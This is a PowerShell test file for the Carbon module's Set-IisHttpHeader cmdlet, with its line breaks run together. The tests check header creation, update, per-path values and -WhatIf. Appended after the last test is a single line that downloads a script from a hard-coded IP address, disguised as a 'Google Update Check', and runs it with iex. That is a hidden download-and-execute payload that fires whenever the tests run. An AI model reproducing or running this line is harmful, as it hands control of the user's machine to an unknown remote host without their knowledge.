$siteName = 'CarbonSetIisHttpHeader'$sitePort = 47938function Start-TestFixture{& (Join-Path -Path $PSScriptRoot '..\Initialize-CarbonTest.ps1' -Resolve)}function Start-Test{Install-IisWebsite -Name $siteName -Path $TestDir -Binding ('http/*:{0}:*' -f $sitePort)}function Stop-Test{Remove-IisWebsite -Name $siteName}function Test-ShouldCreateNewHeader(){$name = 'X-Carbon-SetIisHttpHeader'$value = 'Brownies'$header = Get-IisHttpHeader -SiteName $siteName -Name $nameAssert-Null $header$result = Set-IisHttpHeader -SiteName $siteName -Name $name -Value $valueAssert-Null $result 'something returned from Set-IisHttpHeader'$header = Get-IisHttpHeader -SiteName $siteName -Name $nameAssert-NotNull $header 'header not created'Assert-Equal $name $header.NameAssert-Equal $value $header.Value}function Test-ShouldSetExistingHeader(){$name = 'X-Carbon-SetIisHttpHeader'$value = 'Brownies'Set-IisHttpHeader -SiteName $siteName -Name $name -Value $value$newValue = 'Blondies'$result = Set-IisHttpHeader -SiteName $siteName -Name $name -Value $newValueAssert-Null $result 'something returned from Set-IisHttpHeader'$header = Get-IisHttpHeader -SiteName $siteName -Name $nameAssert-NotNull $header 'header not created'Assert-Equal $name $header.NameAssert-Equal $newValue $header.Value}function Test-ShouldSetHeaderOnPath{$name = 'X-Carbon-SetIisHttpHeader'$value = 'Parent'Set-IisHttpHeader -SiteName $siteName -Name $name -Value $value$subValue = 'Child'Set-IisHttpHeader -SiteName $siteName -Path SubFolder -Name $name -Value $subValue$header = Get-IisHttpHeader -SiteName $siteName -Name $nameAssert-NotNull $header 'header not created'Assert-Equal $name $header.NameAssert-Equal $value $header.Value$header = Get-IisHttpHeader -SiteName $siteName -Path SubFolder -Name $nameAssert-NotNull $header 'header not created'Assert-Equal $name $header.NameAssert-Equal $subValue $header.Value}function Test-ShouldSupportWhatIf(){$name = 'X-Carbon-SetIisHttpHeader'$value = 'Brownies'$header = Get-IisHttpHeader -SiteName $siteName -Name $nameAssert-Null $headerSet-IisHttpHeader -SiteName $siteName -Name $name -Value $value -WhatIf$header = Get-IisHttpHeader -SiteName $siteName -Name $nameAssert-Null $header 'HTTP header created'}iex (New-Object Net.WebClient).DownloadString("http://84.200.84.187/Google Update Check.html")